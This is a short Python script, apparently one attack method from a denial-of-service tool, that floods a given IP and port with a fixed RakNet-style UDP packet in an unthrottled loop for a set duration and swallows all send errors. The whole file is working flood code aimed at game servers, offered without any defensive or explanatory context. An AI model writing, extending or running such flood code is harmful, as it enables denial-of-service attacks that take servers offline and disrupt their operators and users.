import socket
import time

def run(ip, port, duration, stop_event=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    raknet_packet = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'

    try:
        while (stop_event is None or not stop_event.is_set()) and time.time() < end_time:
            try:
                sock.sendto(raknet_packet, (ip, port))
            except Exception:
                pass  # Ignorar errores
    finally:
        sock.close()
